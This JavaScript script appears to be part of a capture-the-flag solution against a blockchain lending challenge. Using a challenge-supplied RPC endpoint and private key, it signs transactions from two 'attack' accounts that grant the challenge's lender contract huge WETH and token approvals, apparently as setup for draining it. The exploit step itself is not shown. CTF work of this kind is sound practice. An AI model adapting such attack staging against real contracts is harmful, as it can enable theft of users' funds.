// import data
const challengeData =			require("./challenge2.json");
const setupABIsetup =			require("./setupABIsetup.json");
const lenderABIerc20like =		require("./lenderABIerc20like.json");

const {attackdouble} =			require("./attackdouble.js");

const ENDPOINT =			challengeData["RPC endpoint"];
const SETUPACCT =			challengeData["Setup contract"];
const ATTACKPRIKEY =			challengeData["Private key"];

// setup
const Web3 = require("web3");

// connect
const web3 = new Web3(ENDPOINT);

async function main() {

	try {	

		// get attacker account so I can check my loot
		var ATTACKACCT = await web3.eth.getAccounts();
		ATTACKACCT = ATTACKACCT.toString();

		// get second attack account
		const ATTACKDBL = attackdouble.address;
		const ATTACKDBLPRIKEY = attackdouble.privateKey;

		// init Setup contract
		const Setup = new web3.eth.Contract(setupABIsetup, SETUPACCT);

		// get token, weth, and lender account addresses
		const token = await Setup.methods.token().call();
		const weth = await Setup.methods.weth().call();
		const lender = await Setup.methods.lender().call();

		// init Lender weth/token contract
		const LenderERC20 = new web3.eth.Contract(lenderABIerc20like, token);

		// approve weth to lender transfer
		const Approve = await LenderERC20.methods.approve(lender, BigInt(500000000000000000000000000000000)).encodeABI();
    		var ApproveTX = {
			to: weth,
       			from: ATTACKACCT,
			gas: 1000000,
			data: Approve,
		};
		var signedTX = await web3.eth.accounts.signTransaction(ApproveTX, ATTACKPRIKEY);
		await web3.eth.sendSignedTransaction(signedTX.rawTransaction, function(error, hash) {
  			if (!error) {console.log("WETH Approval hash: ", hash);
    			} else {console.log("Something went wrong while submitting your transaction:", error)}
   		});
		ApproveTX = {
			to: weth,
       			from: ATTACKDBL,
			gas: 1000000,
			data: Approve,
		};
		signedTX = await web3.eth.accounts.signTransaction(ApproveTX, ATTACKDBLPRIKEY);
		await web3.eth.sendSignedTransaction(signedTX.rawTransaction, function(error, hash) {
  			if (!error) {console.log("WETH Approval hash: ", hash);
    			} else {console.log("Something went wrong while submitting your transaction:", error)}
   		});

		// approve token to lender transfer
    		ApproveTX = {
			to: token,
       			from: ATTACKACCT,
			gas: 1000000,
			data: Approve,
		};
		signedTX = await web3.eth.accounts.signTransaction(ApproveTX, ATTACKPRIKEY);
		await web3.eth.sendSignedTransaction(signedTX.rawTransaction, function(error, hash) {
  			if (!error) {console.log("TOKEN approval hash: ", hash);
    			} else {console.log("Something went wrong while submitting your transaction:", error)}
   		});

		ApproveTX = {
			to: token,
       			from: ATTACKDBL,
			gas: 1000000,
			data: Approve,
		};
		signedTX = await web3.eth.accounts.signTransaction(ApproveTX, ATTACKDBLPRIKEY);
		await web3.eth.sendSignedTransaction(signedTX.rawTransaction, function(error, hash) {
  			if (!error) {console.log("TOKEN approval hash: ", hash);
    			} else {console.log("Something went wrong while submitting your transaction:", error)}
   		});

	} catch (error) {
		
		// catch any random errors
		console.log("Error: " + error);
	}
}

main();
